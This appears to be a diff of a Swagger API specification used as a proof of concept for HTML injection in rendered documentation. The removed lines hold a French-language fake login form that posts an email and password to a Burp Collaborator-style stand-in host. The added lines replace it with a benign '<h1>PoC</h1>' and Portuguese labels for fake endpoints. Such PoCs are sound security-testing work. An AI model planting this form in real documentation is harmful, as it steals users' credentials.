@@ -3,15 +3,9 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <h1>Connectez vous pour commencer à chatter</h1>
-    <form action="https://yourburp.collab.com" method="post">
-    <label for="email">Adresse e-mail:</label>
-    <input name="email">
-    <label for="password">Mot de Passe:</label>
-    <input name="password">
-    <input type="submit" value="Connexion"></form>
+    <h1>PoC</h1>
   version: production
-basePath: https://afine.com
+basePath: https://google.com
 produces:
 - application/xml
 - application/json
@@ -25,11 +19,11 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified
+          description: ENDPOINT de API Falso.
       tags:
       - somettext
       operationId: findAccounts
-      summary: this is example text
+      summary: Exemplo de ataque no ambiente
   "/malformed_by_afine":
     delete:
       parameters:
@@ -43,14 +37,14 @@ paths:
         type: integer
       responses:
         '200':
-          description: No response was specified
+          description: ENDPOINT de API Falso 2.
       tags:
       - afine
       operationId: afine
       summary: afine
     get:
       parameters:
-      - description: this is example text
+      - description: Exemplo de html Injection
         format: int64
         in: path
         name: id
@@ -58,7 +52,7 @@ paths:
         type: integer
       responses:
         '200':
-          description: No response was specified
+          description: <h1></h1>
       tags:
       - afine
       operationId: some_operation
